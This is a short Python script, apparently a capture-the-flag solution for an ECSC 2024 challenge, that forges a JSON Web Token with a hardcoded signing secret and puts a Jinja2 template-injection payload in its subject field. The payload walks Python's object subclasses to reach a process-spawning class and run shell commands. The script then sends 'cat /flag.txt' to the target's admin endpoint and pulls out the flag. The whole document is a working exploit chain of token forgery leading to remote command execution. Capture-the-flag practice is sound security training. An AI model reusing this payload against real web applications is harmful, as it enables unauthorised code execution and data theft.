import jinja2
import datetime
import jwt
import requests
import re

payload = 'admin {{ dict.mro()[-1][request.args.s]()[372](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}'

get_jwt_payload = lambda username: {
  "fresh": False,
  "iat": 1719592823,
  "jti": "acac0127-2ff1-43d5-9028-7acf8090b54a",
  "type": "access",
  "sub": username,
  "exp": datetime.datetime.now() + datetime.timedelta(days=1)
}

base_url = 'https://turtles.ecsc24.hack.cert.pl'

token = jwt.encode(get_jwt_payload(payload), 'turtlerocks', algorithm="HS256")
print(token)

s = requests.Session()

r = requests.get(f'{base_url}/admin?s=__subclasses__&cmd=cat%20/flag.txt', cookies={'access_token_cookie': token})

flag = re.search(r'ecsc24\{.+\}', r.text).group(0)

print(flag)